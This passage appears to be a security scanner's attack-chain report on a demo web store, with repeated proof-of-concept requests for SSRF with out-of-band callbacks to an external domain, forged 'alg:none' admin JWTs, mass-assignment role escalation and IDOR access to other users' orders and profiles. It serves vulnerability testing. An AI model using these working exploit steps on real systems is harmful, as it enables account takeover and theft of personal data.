  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
